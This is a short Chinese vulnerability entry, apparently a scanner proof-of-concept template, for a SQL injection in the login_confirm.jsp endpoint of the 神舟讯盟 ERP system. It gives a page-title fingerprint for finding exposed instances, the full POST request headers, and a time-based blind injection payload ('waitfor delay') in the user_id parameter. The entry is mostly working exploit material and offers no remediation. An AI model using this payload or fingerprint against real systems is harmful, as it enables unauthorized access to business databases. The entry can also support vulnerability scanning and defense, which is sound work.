# 神舟讯盟erplogin_confirm存在SQL注入漏洞

- **系统**：神舟讯盟　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`title=”神州讯盟芯管家”`
- **请求**：`POST /login_confirm.jsp HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`X-Requested-With: XMLHttpRequest`　`Cookie: JSESSIONID=aaaeehfWNHF_uV`　`Content-Length: 222`　`id: szxm-erp-login_confirm-sqli`　`name: szxm-erp-login_confirm-sqli`　`author: XA`　`severity: high`

**请求体 / payload**
```
macadress=1&password=g00dPa%24%24w0rD&sn=8&url=/SunmoIC/698D51A19D8A121CE581499D7B701668.jsp&url2=/SunmoIC/698D51A19D8A121CE581499D7B701668.jsp&user_id=hUvn8soT';%20waitfor%20delay%20'0:0:6'%20--%20&version=%E4%B8%AD%E6%96%87&wm_types=%E6%A8%A1%E6%80%81%E7%AA%97%E5%8F%A3
- raw:
-
Content-Type: application/x-www-form-urlencoded
X-Requested-With: XMLHttpRequest
Cookie: JSESSIONID=aaaeehfWNHF_uV
Content-Length: 271
Host: {{Hostname}}
macadress=1&password=g00dPa%24%24w0rD&sn=8&url=/SunmoIC/698D51A19D8A121CE581499D7B701668.jsp&url2=/SunmoIC/698D51A19D8A121CE581499D7B701668.jsp&user_id=hUvn8soT';%20…（脚本共 804 字，完整版见原文）
```
- **预期**：200　|　—